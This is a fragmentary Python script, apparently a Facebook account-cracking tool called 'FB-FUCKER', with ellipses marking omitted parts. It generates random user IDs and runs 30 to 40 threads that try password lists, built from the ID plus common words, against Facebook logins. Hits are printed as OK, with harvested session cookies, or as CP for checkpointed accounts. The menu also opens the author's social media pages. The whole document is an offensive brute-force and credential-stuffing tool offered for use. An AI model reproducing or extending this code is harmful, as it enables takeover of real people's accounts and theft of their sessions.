...
╚╝──╚═══╩═══╩╝╚═╩═══╩╝╚═╝
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} FUCKER                 {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}JIBON AHMED             {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+88018*******          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/NAI{N}    {H}  ║
 ...
 {K}[{H}√{K}]{P}       {H} The FUCKER ♡︎ Is BACK 
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract FB-FUCKER ♡︎')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/JIBON-XD-FUCKER/");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/permanent009");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FUCKER {P}Terminal ');os.system("xdg-open https://www.facebook.com/permanent009");time.sleep(3);os.system('xdg-open https://www.facebook.com/JIBON.AHMED2007');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/JIBON.AHMED65");mainx()
def mainx2():
    os.system("clear")
    banner()
    ...
    if mahin in ["1","01"]:
     ...
     mainx()
        ...
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.FUCKER ♡︎.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
...
def gf1(): 
    ...
    for nmbr in range(limit):
        ...
        idf.append(nmp)
    with tred(max_workers=40) as FUCKER ♡︎_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        ...
        for number in idf:
            ...
            if mthd in ['1','01']:FUCKER ♡︎_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:FUCKER ♡︎_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:FUCKER ♡︎_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:FUCKER ♡︎_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:FUCKER ♡︎_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:FUCKER ♡︎_xd.submit(f1,idf,pwv)
            else:
               FUCKER ♡︎_xd.submit(m5,idf,pwv)
...
def x8():
  ...
  for nmbr in range(limit):
    ...
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as FUCKER ♡︎_xd:
    os.system('clear')
    tl = str(len(user))
    ...
    for guru in user:
      ...
      if hc in ['1','01']:FUCKER ♡︎_xd.submit(m1,idf,pwv)
      elif hc in ['2','02']:FUCKER ♡︎_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:FUCKER ♡︎_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:FUCKER ♡︎_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:FUCKER ♡︎_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:FUCKER ♡︎_xd.submit(f1,idf,pwv)
      else:
       FUCKER ♡︎_xd.submit(main,idf,pwv)
...
def x7():
  ...
  with tred(max_workers=30) as FUCKER ♡︎_xd:
    ...
    for guru in user:
      ...
      if hc in ['1','01']:FUCKER ♡︎_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:FUCKER ♡︎_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:FUCKER ♡︎_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:FUCKER ♡︎_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:FUCKER ♡︎_xd.submit(f1,idf,pwv)
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-FUCKER ♡︎.py')
...
def x6():
  ...
  with tred(max_workers=30) as FUCKER ♡︎_xd:
    ...
    for guru in user: 
      ...
      if hc in ['1','01']:FUCKER ♡︎_xd.submit(m33,idf,pwv)
      elif hc in ['2','02']:FUCKER ♡︎_xd.submit(m2,idf,pwv)
      elif hc in ['3','03']:FUCKER ♡︎_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:FUCKER ♡︎_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:FUCKER ♡︎_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:FUCKER ♡︎_xd.submit(f1,idf,pwv)
  ...
  with tred(max_workers=30) as FUCKER ♡︎_xd:
    ...
    for guru in user:
     ...
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:FUCKER ♡︎_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:FUCKER ♡︎_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:FUCKER ♡︎_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:FUCKER ♡︎_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:FUCKER ♡︎_xd.submit(f1,idf,pwv)
      elif 'f1' in mtd:FUCKER ♡︎_xd.submit(f1,idf,pwv)
      else:
       FUCKER ♡︎_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-FUCKER ♡︎.py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mFUCKER ♡︎","\x1b[1;92mFUCKER ♡︎","\x1b[1;93mFUCKER ♡︎","\x1b[1;94mFUCKER ♡︎","\x1b[1;95mFUCKER ♡︎","\x1b[1;96mFUCKER ♡︎","\x1b[1;97mFUCKER ♡︎","\x1b[1;91mFUCKER ♡︎","\x1b[1;92mFUCKER ♡︎","\x1b[1;93mFUCKER ♡︎","\x1b[1;94mFUCKER ♡︎","\x1b[1;95mFUCKER ♡︎","\x1b[1;96mFUCKER ♡︎"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mFUCKER ♡︎-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             ...
             break
                ...
                ok+=1
                print(f'\r{P} [{H}FUCKER ♡︎-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [FUCKER ♡︎-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mFUCKER ♡︎-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
